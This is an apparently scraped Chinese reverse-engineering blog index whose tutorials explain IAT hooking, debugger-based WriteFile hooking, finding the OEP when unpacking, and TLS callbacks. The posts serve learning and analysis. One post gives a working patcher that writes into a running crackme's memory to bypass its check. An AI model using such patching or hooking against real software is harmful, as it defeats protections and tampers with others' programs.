0, NULL); CloseHandle(hThread); for(i = 0; i &lt; 100; i++) &#123; Sleep(500); printf(&quot;----------------%d \n&quot;, i); &#125; return]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[函数调用约定]]></title>
    <url>%2F2020%2F05%2F25%2F%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A%2F</url>
    <content type="text"><![CDATA[1、cdeclcdecl是主要在C语言中使用的方式，使用ADD ESP，X的方式整理堆栈。 2、stdcallstdcall方式常用于Win32 API，栈清理由RETN X进行。 3、fastcallfastcall与stdcall类似，但是它会用到ecx、edx进行传参。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IAT HOOK]]></title>
    <url>%2F2020%2F05%2F14%2FIAT%20HOOK%2F</url>
    <content type="text"><![CDATA[1、IAT钩取工作原理进程的IAT中保存着程序中调用的API的地址，IAT钩取通过修改IAT中保存的API地址来钩取某个API。图中描述的是计算器（calc.exe）进程正常调用user32.SetWindowTextW()API的情形。地址01001110属于IAT区域，程序开始运行时，PE装载器会将user32.SetWindowTextW()API地址（77D0960E）记录到该地址（01001110）。01002628地址处的CALL DWORD PTR [01001110]指令最终会调用保存在01001110地址（77D0960E）处的函数，直接等同于CALL 77D0960E命令。执行完地址01002628处的CALL命令后，运行将转移到user32.SetWindowTextW()函数的起始地址（77D0960E）处，执行完user32.SetWindowTextW()后返回。下图是IAT被钩取后计算器进程的运行过程。hookiat.dll文件中通过了了名为MySetWindowTextW()的钩取函数（10001000）。地址01002628处的CALL指令执行后，会跟踪进入10001000，而不是01001110。经过一系列的处理后，执行1000107D处的CALL命令，转到原user32.SetWindowTextW()函数的起始地址。user32.SetWindowTextW()API执行完毕后，执行会返回到hookiat.dll的1000107D地址的下雨天指令，然后返回到01002628地址的下一条指令继续执行。 2、演示示例（1）calc.exe（2）hookiat.dll（3）InjectDll.exe 12InjectDll.exe i pID hookiat.dll //钩取命令InjectDll.exe e pID hookiat.dll //脱钩命令 钩取后程序运行的样子： 3、源代码分析1、DllMain()1234567891011121314151617181920212223BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123; switch( fdwReason ) &#123; case DLL_PROCESS_ATTACH : // 保存原始API地址 g_pOrgFunc = GetProcAddress(GetModuleHandle(L&quot;user32.dll&quot;), &quot;SetWindowTextW&quot;); // # hook // 用hookiat.MySetWindowText()钩取user32.SetWindowTextW() hook_iat(&quot;user32.dll&quot;, g_pOrgFunc, (PROC)MySetWindowTextW); break; case DLL_PROCESS_DETACH : // # unhook // 将IAT恢复 hook_iat(&quot;user32.dll&quot;, (PROC)MySetWindowTextW, g_pOrgFunc); break; &#125; return TRUE;&#125; 2、MySetWindowTextW()1234567891011121314151617181920BOOL WINAPI MySetWindowTextW(HWND hWnd, LPWSTR lpString)&#123; wchar_t* pNum = L&quot;零一二三四五六七八九&quot;; wchar_t temp[2] = &#123;0,&#125;; int i = 0, nLen = 0, nIndex = 0; nLen = wcslen(lpString); for(i = 0; i &lt; nLen; i++) &#123; // 将阿拉伯数字转换为中文数字 if( L&apos;0&apos; &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= L&apos;9&apos; ) &#123; temp[0] = lpString[i]; nIndex = _wtoi(temp); lpString[i] = pNum[nIndex]; &#125; &#125; // 调用user32.SetWindowTextW()API return ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);&#125; SetWindowTextW()API定义如下： 1234BOOL SetWindowTextW( HWND hwnd, LPCTSTR lpString); 它有两个参数，第一个为窗口句柄（hWnd），第二个参数为字符串指针（lpString）。阿拉伯数字字符串转换为中文数字字符串情形如下： 3、hook_iat()1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859BOOL hook_iat(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)&#123; HMODULE hMod; LPCSTR szLibName; PIMAGE_IMPORT_DESCRIPTOR pImportDesc; PIMAGE_THUNK_DATA pThunk; DWORD dwOldProtect, dwRVA; PBYTE pAddr; // hMod, pAddr = ImageBase of calc.exe // = VA to MZ signature (IMAGE_DOS_HEADER) hMod = GetModuleHandle(NULL); pAddr = (PBYTE)hMod; // pAddr = VA to PE signature (IMAGE_NT_HEADERS) pAddr += *((DWORD*)&amp;pAddr[0x3C]); // dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table dwRVA = *((DWORD*)&amp;pAddr[0x80]); // pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA); for( ; pImportDesc-&gt;Name; pImportDesc++ ) &#123; // szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name szLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name); if( !_stricmp(szLibName, szDllName) ) &#123; // pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk // = VA to IAT(Import Address Table) pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod + pImportDesc-&gt;FirstThunk); // pThunk-&gt;u1.Function = VA to API for( ; pThunk-&gt;u1.Function; pThunk++ ) &#123; if( pThunk-&gt;u1.Function == (DWORD)pfnOrg ) &#123; VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, 4, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); pThunk-&gt;u1.Function = (DWORD)pfnNew; VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, 4, dwOldProtect, &amp;dwOldProtect); return TRUE; &#125; &#125; &#125; &#125; return FALSE;&#125; hook_iat()函数的前半部分用来读取PE文件头信息，并查找IAT的位置。 12345hMod = GetModuleHandle(NULL); // hMod = ImageBase pAddr = (PBYTE)hMod; // pAddr = IMAGE_NT_HEADERS pAddr += *((DWORD*)&amp;pAddr[0x3C]); // pAddr = &quot;PE&quot; signature dwRVA = *((DWORD*)&amp;pAddr[0x80]); // dwRVA = VA to IMAGE_IMPORT_DESCRIPTOR Table pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA); 找到IMAGE_IMPORT_DESCRIPTOR表后，用for循环遍历，查找user32.dll的IAT。pImportDesc-&gt;FirstThunk成员所指的就是IAT。然后再循环遍历，查找SetWindowTextW的位置。找到后，修改为MySetWindowTextW的地址。 1pThunk-&gt;u1.Function = (DWORD)pfnNew; 这样，计算器代码调用user32.SetWindowTextW()API时，实际会先调用hookiat.MySetWindowTextW()函数。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>Hook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[破解补丁]]></title>
    <url>%2F2020%2F05%2F06%2F%E7%A0%B4%E8%A7%A3%E8%A1%A5%E4%B8%81%2F</url>
    <content type="text"><![CDATA[1、程序实例Cosh.1.exe破解前：破解后： 2、查找打补丁地址通过字符串搜索，可以定位到关键点。 12地址 硬编码 汇编代码0040138C 0F84 F3000000 je Cosh.1.00401485 如果比较结果为相等，则跳转，输出字符串“Well done，Cracker”。将跳转指令je改成jmp，实现无条件跳转，输出“Well done，Cracker”。 123地址 硬编码 汇编代码0040138C E9 F4000000 jmp Cosh.1.0040148500401391 90 nop 通过上面过程可以看出只要将内存地址0x0040138C处的6个字节0F 84 F3 00 00 00改成E9 F4 00 00 00 90就能达到破解目的。 3、代码实现1、实现这个功能首先我们需要了解几个API。1、CreateToolhelp32Snapshot()能获得系统进程快照的句柄。 123456HANDLEWINAPICreateToolhelp32Snapshot( DWORD dwFlags, DWORD th32ProcessID ); 2、Heap32ListFirst()查找系统进程快照中的第一个进程。 123456BOOLWINAPIHeap32ListFirst( HANDLE hSnapshot, LPHEAPLIST32 lphl ); 3、Process32Next()获得下一个进程。 123456BOOLWINAPIProcess32Next( HANDLE hSnapshot, LPROCESSENTRY32 lppe ); 4、tagPROCESSENTRY32结构体能够保存进程的信息。 123456789101112131415typedef struct tagPROCESSENTRY32&#123; DWORD dwSize; DWORD cntUsage; DWORD th32ProcessID; // this process ULONG_PTR th32DefaultHeapID; DWORD th32ModuleID; // associated exe DWORD cntThreads; DWORD th32ParentProcessID; // this process&apos;s parent process LONG pcPriClassBase; // Base priority of process&apos;s threads DWORD dwFlags; CHAR szExeFile[MAX_PATH]; // Path&#125; PROCESSENTRY32;typedef PROCESSENTRY32 * PPROCESSENTRY32;typedef PROCESSENTRY32 * LPPROCESSENTRY32; 4、OpenProcess()用来打开一个已存在的进程对象，并返回进程的句柄。 12345678WINBASEAPIHANDLEWINAPIOpenProcess( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId ); 5、WriteProcessMemory()对内存区域进行读写。 1234567891011WINBASEAPI_Success_(return != FALSE)BOOLWINAPIWriteProcessMemory( _In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, _In_reads_bytes_(nSize) LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_opt_ SIZE_T* lpNumberOfBytesWritten ); 2、代码先在系统中查找需要打补丁程序的进程名与进程ID，然后通过WriteProcessMemory()函数对内存进行读写，将内存地址0x0040138C处的6个字节0F 84 F3 00 00 00改成E9 F4 00 00 00 90。 12345678910111213141516171819202122232425262728293031323334353637#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;TlHelp32.h&gt;int main()&#123; HANDLE hProceessnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//创建进程快照 if (hProceessnap == INVALID_HANDLE_VALUE) &#123; printf(&quot;创建进行快照失败\n&quot;); return -1; &#125; else &#123; PROCESSENTRY32 pe32; byte Patch[] = &#123; 0xE9, 0xF4, 0x00, 0x00, 0x00, 0x90 &#125;;//补丁数据 pe32.dwSize = sizeof(pe32); BOOL hProcess = Process32First(hProceessnap, &amp;pe32); char buff[1024]; char name[26] = &quot;Cosh.1.exe&quot;;//要打补丁程序的进程名 while (hProcess) &#123; if (_stricmp(pe32.szExeFile, name) == 0)//进行比较 &#123; HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pe32.th32ProcessID);//获得进程句柄 WriteProcessMemory(hHandle, (LPVOID)0x0040138C, Patch, 6, NULL);//写入内存 MessageBoxA(0, &quot;成功！&quot;, &quot;补丁&quot;, 0); break; &#125; memset(buff, 0x00, 1024); hProcess = Process32Next(hProceessnap, &amp;pe32); &#125; &#125; CloseHandle(hProceessnap); system(&quot;pause&quot;); return 0;&#125; 将程序Cosh.1.exe运行，再运行编译成功的补丁程序。通过Windbg的附加功能，我们可以看到，地址0x0040138C处的六个字节代码已经呗更改，破解成功。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[脱壳技术——寻找OEP]]></title>
    <url>%2F2020%2F04%2F09%2F%E8%84%B1%E5%A3%B3%E6%8A%80%E6%9C%AF%E2%80%94%E2%80%94%E5%AF%BB%E6%89%BEOEP%2F</url>
    <content type="text"><![CDATA[1、根据栈平衡原理寻找OEP在编写加壳软件时，必须保证外壳初始化的现场环境（各寄存器的值）与原程序的现场环境是相同的。加壳程序在初始化时保存各寄存器的值，待外壳执行完毕恢复各寄存器的内容，最后跳转到原程序执行。通常用pushad/popad，pushfd/popfd指令对来保存与恢复现场环境。下面我们来脱一下示例文件RebPE的壳。程序刚加载时的寄存器和堆栈。在执行pushad指令后，各寄存器的值将被压入19FF54h~19FF70h的栈中。此时esp指向19FF54h。对这个地址设置硬件访问断点：hr 19FF54。按“F9”键运行程序。外壳代码处理结束后，再调用popad指令恢复现场环境。在按“F8”单步来到401130h这一行，会发现寄存器恢复pushad前的状态。执行完retn指令后，跳转到OEP。 2、用内存访问断点寻找OEP外壳先将压缩的代码并释放到对应的区块上，处理完毕再跳转到代码段执行。当对代码段设置内存访问断点时，一定会中断在外壳对代码进行读取的那句指令上。按“Alt+M”组合键打开内存模块，对代码段按F2键设置内存访问断点。对.txt区块设置内存访问断点后，按“F9”键运行程序，程序将中断在如下代码处。上面这段代码是解压函数，走出这个函数，将来到外壳代码处，具体如下。这段代码依次将区块解压并放到正确位置。将代码段全部解压后，对代码段（.txt区块）设置内存访问断点。按“F9”键执行程序，程序将在OEP处中断。还可以通过先在.rdata、.data等区块处设置内存访问断点，待程序中断，代码已解压，再对代码段设置内存访问断点，到达OEP。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>脱壳</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[脱壳技术——基础知识篇]]></title>
    <url>%2F2020%2F04%2F08%2F%E8%84%B1%E5%A3%B3%E6%8A%80%E6%9C%AF%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AF%87%2F</url>
    <content type="text"><![CDATA[壳和病毒在某些方面类似，都需要比原程序代码更早地获取控制权。壳修改了原程序文件的组织结构，从而能够比原程序早获得控制权，而且不影响原程序的正常执行。 1、保存入口参数加载程序在初始化时会保存各寄存器的值，待外壳执行完毕，再恢复各寄存器的内容，最后跳转到原程序执行。通常用pushad/popad、pushfd/popfd指令对来保存与恢复现场环境。 2、获取壳本身需要的API地址在一般情况下，外壳的输入表中只有GetProcAddress、GetModuleHandle和LoadLibrary这三个API函数，甚至只有kernel32.dll和GetProcAddress。如果需要使用其他API函数，可以通过函数LoadLibraryA(W)或LoadLibraryExA(W)将DLL文件映像映射到调用进程的地址空间中，函数返回的HINSTANCE值用于标识文件影响所映射的虚拟内存地址。LoadLibrary函数的原型如下。 123HINSTANCE LoadLibrary( LPCTSTR lpLibFileName); 如果DLL文件已经被映射到调用进程的地址空间中，可以调用GetModuleHandleA(W)函数获取DLL模块句柄。函数原型如下。 123HINSTANCE GetModuleHandleA(W)( LPCTSTR lpLibFileName); 一旦DLL模块被加载，线程就可以调用GetProcAddress函数获取输入函数的地址了。函数原型如下。 1234FARPROC GetProcAddress( HMODULE hModule, LPCSTR lpProcName); 3、解密原程序各个区块的数据出于保护原程序代码和数据的目的，壳一般会加密原程序文件的各个区块。在执行程序时，外壳将解密这些区块，从而使程序能够正常运行。 4、IAT初始化IAT的填写本来由PE装载器实现，但由于在加壳时构造了一个自建输入表，并让PE文件头数据目录表中的输入表指针指向自建的输入表，PE装载器会对自建的输入表进行填写。程序的原始输入表被外壳变形后存储，IAT的填写会由外壳程序实现。外壳要做的就是将这个变形输入表的结构从头到尾扫描一遍，重新获取每一个DLL引入的所以函数的地址，并将其填写在IAT中。 5、重定位项的处理因为Windows操作系统没办法保证在DLL每次运行时都提供相同的基地址，因此在壳中也要有用于“重定位”的代码，否则原程序中的代码无法正常运行。 6、Hook API在程序文件中，输入表的作用是让Windows操作系统在程序运行时将API的实际地址提供给程序使用。壳大都在修改原程序文件的输入表后自己模仿Windows操作系统的工作流程，向输入表中填充相关的数据。在填充过程中，外壳可以填充Hook API代码的地址，从而间接获得程序的控制权。 7、跳转到程序原入口点壳将控制权还给原程序。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>脱壳</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TLS回调函数]]></title>
    <url>%2F2020%2F04%2F06%2FTLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[代码逆向分析领域中，TLS（Thread Local Storage，线程局部存储）回调函数（Callback Function）常用于反调试。TLS回调函数的调用运行要先于EP代码的执行，该特征使它可以作为一种反调试技术使用。 1、程序：HelloTls.exe运行练习程序文件（HelloTls.exe），弹出1一个消息框，单机“确定”按钮后，程序终止运行。下面使用OllyDbg调试练习示例程序。在OllyDbg调试器中打开并运行HelloTls。.exe文件，弹出如下对话框。点击确定，按钮，进程终止。 2、TLS1、IMAFGE_DATA_DIRECTORY[9]若在编程中启用了TLS功能，PE头文件中就会设置TLS表（TLS Table）项目。2、IMAGE_TLS_DIRECTORY 12345678910111213141516171819202122232425262728typedef struct _IMAGE_TLS_DIRECTORY64 &#123; ULONGLONG StartAddressOfRawData; ULONGLONG EndAddressOfRawData; ULONGLONG AddressOfIndex; ULONGLONG AddressOfCallBacks; DWORD SizeOfZeroFill; DWORD Characteristics;&#125; IMAGE_TLS_DIRECTORY64；typedef IMAGE_TLS_DIRECTORY64 * PIMAGE_TLS_DIRECTORY64;typedef struct _IMAGE_TLS_DIRECTORY32 &#123; DWORD StartAddressOfRawData; DWORD EndAddressOfRawData; DWORD AddressOfIndex; DWORD AddressOfCallBacks; DWORD SizeOfZeroFill; DWORD Characteristics;&#125; IMAGE_TLS_DIRECTORY32；typedef IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32;#ifdef _WIN64typedef IMAGE_TLS_DIRECTORY64 IMAGE_TLS_DIRECTORY64；typedef PIMAGE_TLS_DIRECTORY64 PIMAGE_TLS_DIRECTORY64;#elsetypedef IMAGE_TLS_DIRECTORY32 IMAGE_TLS_DIRECTORY32；typedef PIMAGE_TLS_DIRECTORY32 PIMAGE_TLS_DIRECTORY32; IMAGE_TLS_DIRECTORY结构体有两种版本，分别为32位与64位。使用工具查看IMAGE_TLS_DIRECTORY结构体，如图所示。3、回调函数地址数组该数组中实际存储的就是TLS回调函数的地址。进程启动时，系统会逐一调用存储在该数组中的函数。 3、TLS回调函数创建或终止某线程时，TLS回调函数都会自动调用执行，前后共两次。TLS回调函数的定义代码如下。 123456typedef VOID(NTAPI *PIMAGE_TLS_CALLBACK) ( PVOID DllHandle, DWORD Reason, PVOID Reserved);]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[x64处理器]]></title>
    <url>%2F2020%2F04%2F04%2Fx64%E5%A4%84%E7%90%86%E5%99%A8%2F</url>
    <content type="text"><![CDATA[1、64位64位系统中内存地址为64位（8个字节），使用64位大小的指针。所以含有绝对地址（VA）的指令大小比原来增加了4个字节。同样，寄存器的大小以及栈的基本单位也变成64位。 2、内存x64系统中进程虚拟内存的实际大小为16TB。 3、通用寄存器x64系统中，通用寄存器的大小扩展到64位，数量也增加到18个。所有通用寄存器的名称均以字母“R”开头。为了向下兼容，支持访问寄存器的8位、16位、32位。 4、CALL/JMP指令地址指令由原来的4个字节变成8个字节，为了防止指令长度增加，x64系统中指令后面仍然跟着4个字节大小的地址，只不过该地址被解析为“相对地址”（RVA）。说明： 5、函数调用约定32位系统中使用的函数调用约定包括cdecl、stdcall、fastcall等几种，但64位系统中它们统一为一种变形的fastcall。64位fastcall中最多可以把函数的4个参数存储到寄存器中传递。各参数顺序由寄存器确定。若函数的参数超过4个，则与栈并用。 6、栈&amp;栈帧调用子函数时，不再用PUSH命令来传递参数，而是通过MOV指令操作寄存器与预定的栈来传递。并且创建栈帧时也不再使用RBP寄存器，而是直接使用RSP寄存器来实现。这样能大幅度提升程序的运行速度]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记事本WriteFile() API钩取]]></title>
    <url>%2F2020%2F03%2F30%2F%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96%2F</url>
    <content type="text"><![CDATA[1、调试技术流程具体调试流程如下： 1、对想钩取的进程进行附加操作，使之成为被调试者； 2、“钩子”：将API起始地址的第一个字节修改为0xCC； 3、调用相应API时，控制权转移到调试器； 4、执行需要的操作（操作参数、返回值等）； 5、脱钩：将0xCC恢复原值； 6、运行相应API（无0xCC的正常状态）； 7、“钩子”：再次修改为0xCC（为了继续钩取）； 8、控制器返还被调试者。以上是最简单的情形，在此基础上可以有多种变化。 2、记事本WriteFile() API钩取首先运行Notepad.exe，获取其PID。运行钩取程序（hookdbg.exe）。hookdbg.exe是基于控制台的程序，其运行参数为目标进程的PID，运行hookdbg.exe程序后，就开始了对notepad进程的WriteFile() API的钩取，如图所示。然后在notepad中随意输入一下英文小写字母，如图所示。完成输入后保存，notepad界面中不会有任何变化。关闭notepad，查看hookdbg程序的控制台窗口，如图所示。打开保存的txt文件，查看实际文本是以大写字母形式保存。 3、工作原理WriteFile()定义： 1234567BOOL WriteFile( HANDLE hFile, LPCVOID lpBuffer, //数据缓冲区指针 DWORD nNumberOfBytesToWrote, //要写的字节数 LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped); 使用OllyDbg打开notepad后，在Kernel32!WriteFile() API处设置断点，按（F9）键运行程序。在记事本中输入文本后，以合适的文件名保存，在OllyDbg代码窗口中可以看到，调试器在kernel32!WriteFile()处暂停，然后查看进程，发现当前栈中存在一个返回值，ESP+8中存在数据缓冲区的地址。直接转到数据缓冲区地址处，可以看到要保存到notepad的字符串。钩取WriteFile() API后，用指定字符串覆盖数据缓冲区中的字符串即可达成所愿。 4、源代码分析1、main()12345678910111213141516171819202122int main(int argc, char * argv[])&#123; DWORD dwPID; if(argc != 2) &#123; printf(&quot;\nUSAGE : hookdbg.exe &lt;pid&gt;\n&quot;); return 1; &#125; dwPID = atoi(argv[1]); if(!DebugActiveProcess(dwPID)) &#123; printf(&quot;DebugActiveProcess(%d) failed!!!\n&quot; &quot;Error Code = %d\n&quot;, dwPID, GetLastError()); return 1; &#125; DebugLoop(); return 0;&#125; main()函数以程序运行参数的形式接收要钩取API的进程的PID，然后通过DebugActiveProcess() API将调试器附加到该运行的进程上，开始调试。 123BOOL WINAPI DebugActiveProcess( DWORD dwProcessId); 然后进入DebugLoop()函数，处理来自被调试者的调试事件。 2、DebugLoop()12345678910111213141516171819202122232425262728void DebugLoop()&#123; DEBUG_EVENT de; DWORD dwContinueStatus; //等待被调试者发生事件 while(WaitForDebugEvent(&amp;de, INFINITE)) &#123; dwContinueStatus = DBG_CONTINUE; //被调试进程生成或者附加事件 if(CREATE_PROCESS_DEBUD_EVENT == de.dwDebugEventCode) &#123; OnCreateProcessDebugEvent(&amp;de); &#125; //异常事件 else if( EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode ) &#123; if( OnExceptionDebugEvent(&amp;de) ) continue; &#125; //被调试进程终止事件 else if( EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode ) &#123; break; &#125; //再次运行被调试者 ContinueDebugEvent(de.dwProcessId, de.dwThreadId, dwContinueStatus); &#125;&#125; DebugLoop()函数的工作原理类似于窗口过程函数，它从被调试者处接收事件并处理，然后被调试事件者继续运行。WaitForDebugEvent() API是一个等待被调试者发生调试事件的函数。 1234BOOL WINAPI WaitForDebugEvent( LPDEBUG_EVENT lpDebugEvent, DWORD dwMilliseconds); DebugLoop()函数代码中，若发生调试事件，WaitForDebugEvent() API就会将相关事件信息设置到其第一个参数的变量（DEBUG_EVENT结构体对像），然后立刻返回。 1234567891011121314151617typedef struct _DEBUG_EVENT &#123; // de DWORD dwDebugEventCode; DWORD dwProcessId; DWORD dwThreadId; union &#123; EXCEPTION_DEBUG_INFO Exception; CREATE_THREAD_DEBUG_INFO CreateThread; CREATE_PROCESS_DEBUG_INFO CreateProcessInfo; EXIT_THREAD_DEBUG_INFO ExitThread; EXIT_PROCESS_DEBUG_INFO ExitProcess; LOAD_DLL_DEBUG_INFO LoadDll; UNLOAD_DLL_DEBUG_INFO UnloadDll; OUTPUT_DEBUG_STRING_INFO DebugString; RIP_INFO RipInfo; &#125; u; &#125; DEBUG_EVENT; ContinueDebugEvent() API是一个使被调试者继续运行的函数。 12345678BOOL ContinueDebugEvent(DWORD dwProcessId, // process to continueDWORD dwThreadId, // thread to continueDWORD dwContinueStatus // continuation status); DebugLoop()函数处理三种调试事件，如下所示。 1、EXIT_PROCESS_DEBUG_EVENT 2、CREATE_PROCESS_DEBUG_EVENT 3、EXCEPTION_DEBUG_EVENT3、EXIT_PROCESS_DEBUG_EVENT被调试进程终止时会插发该事件。 4、CREATE_PROCESS_DEBUG_EVENT（OnCreateProcessDebugEvent()）OnCreateProcessDebugEvent()是CREATE_PROCESS_DEBUG_EVENT事件句柄，被调试进程启动时即调用执行该函数。 123456789101112BOOL OnCreateProcessDebugEvent(LPDEBUG_EVENT pde)&#123; //获取WriteFile() API地址 g_pfWriteFile = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;WriteFile&quot;); //更改第一个字节为0xCC（INT3），originalbyte是g_ch0rgByte备份 memcpy(&amp;g_cpdi, &amp;pde-&gt;u.CreateProcessInfo, sizeof(CREATE_PROCESS_DEBUG_INFO)); ReadProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_OrgByte, sizeof(BYTE), NULL); WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chINT3, sizeof(BYTE), NULL); return TRUE;&#125; 首先获取WriteFile() API的起始地址，它获取的不是被调试进程的内存地址，而是调试进程的内存地址。对于Windows OS的系统而言，它们在所有进程中都会加载到相同地址。g_cpdi是CREATE_PROCESS_DEBUG_INFO结构体变量。 123456789101112typedef struct _CREATE_PROCESS_DEBUG_INFO &#123; // cpdi HANDLE hFile; HANDLE hProcess; HANDLE hThread; LPVOID lpBaseOfImage; DWORD dwDebugInfoFileOffset; DWORD nDebugInfoSize; LPVOID lpThreadLocalBase; LPTHREAD_START_ROUTINE lpStartAddress; LPVOID lpImageName; WORD fUnicode; &#125; CREATE_PROCESS_DEBUG_INFO; 通过CREATE_PROCESS_DEBUG_INFO结构体的hProcess成员，可以钩取WriteFile() API。由于调试器拥有被调试进程的句柄，所以可以使用ReadProcessMemory()、WriteProcessMemory() API对被调试进程的内存空间自由进行读写操作。通过ReadProcessMemory()读取WriteFile() API的第一个字节，将其保存到g_chOrgByte变量，后面脱钩会用到。然后用WriteProcessMemory() API的第一个字节更改为0xCC，将控制权转移到调试器。 5、EXCEPTION_DEBUG_EVENT（OnExceptionDebugEvent()）OnExceptionDebugEvent()是EXCEPTION_DEBUG_EVENT事件句柄，它处理被调试者的INT3指令。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465BOOL OnExceptionDebugEvent(LPDEBUG_EVENT pde)&#123; CONTEXT ctx; PBYTE lpBuff = NULL; DWORD dwNumOfBytesToWrite, dwAddress; PEXCEPTION_RECORD per = &amp;pde-&gt;u.Exception.ExpectionRecord; //断点异常时 if(EXCEPTION_BREAKPOINT == per-&gt;ExceptionCode) &#123; //断点地址为WriteFile() API地址时 if(g_pfWriteFile == per-&gt;ExceptionAddress) &#123; //Unhook，将0xCC恢复为original byte WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chOrgByte, sizeof(BYTE), NULL); //获取线程上下文 ctx.ContextFlags = CONTEXT_CONTROL; GetThreadContext(g_cpdi.hThead, &amp;ctx); //获取WriteFile()的param 2、3值，param 2 = ESP + 0x8、param 3 = ESP + 0xC ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0x8), &amp;dwAddrOfBuffer, sizeof(DWORD), NULL); ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp +0xC), &amp;dwNumOfBytesToWrite, sizeof(DWORD), NULL); //分配临时缓冲区 lpBuffer = (PBYTE)malloc(dwNumOfBytesToWrite+1); memset(lpBuffer, 0, dwNumOfBytesToWrite+1); //复制WriteFile()缓冲区到临时缓冲区 ReadProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, lpBuffer, dwNumOfBytesToWrite, NULL); printf(&quot;\n### original string ###\n%s\n&quot;, lpBuffer); //将小写字母转换为大写字母 for( i = 0; i &lt; dwNumOfBytesToWrite; i++ ) &#123; if( 0x61 &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= 0x7A ) lpBuffer[i] -= 0x20; &#125; printf(&quot;\n### converted string ###\n%s\n&quot;, lpBuffer); //将变换后的缓冲区复制到WriteFile()缓冲区 WriteProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, lpBuffer, dwNumOfBytesToWrite, NULL); //释放临时缓冲区 free(lpBuffer); //将线程上下文的EIP更改为WriteFile()的首地址 ctx.Eip = (DWORD)g_pfWriteFile; SetThreadContext(g_cpdi.hThread, &amp;ctx); //运行被调试进程 ContinueDebugEvent(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE); Sleep(0); //API&quot;钩子&quot; WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chINT3, sizeof(BYTE), NULL); return TRUE; &#125; &#125; return FALSE;&#125; 1、“脱钩”首先需要“脱钩”，在将小写字母转换为大写字母后需要正常调用WriteFile()函数。 12//Unhook，将0xCC恢复为original byteWriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chOrgByte, sizeof(BYTE), NULL); 2、获取线程上下文再次运行先前线程时，必须有运行所需的信息，这些重要信息指的就是CPU中各寄存器的值。通过这些值，才能保证CPU能够再次准确运行它。负责保存CPU寄存器信息的就是CONTEXT结构体，它的定义如下。 123456789101112131415161718192021222324252627282930313233typedef struct _CONTEXT&#123; DWORD ContextFlags // -| +00h DWORD Dr0 // | +04h DWORD Dr1 // | +08h DWORD Dr2 // &gt;调试寄存器 +0Ch DWORD Dr3 // | +10h DWORD Dr6 // | +14h DWORD Dr7 // -| +18h FLOATING_SAVE_AREA FloatSave; //浮点寄存器区 +1Ch~~~88h DWORD SegGs //-| +8Ch DWORD SegFs // |\段寄存器 +90h DWORD SegEs // |/ +94h DWORD SegDs //-| +98h DWORD Edi //________ +9Ch DWORD Esi // | 通用 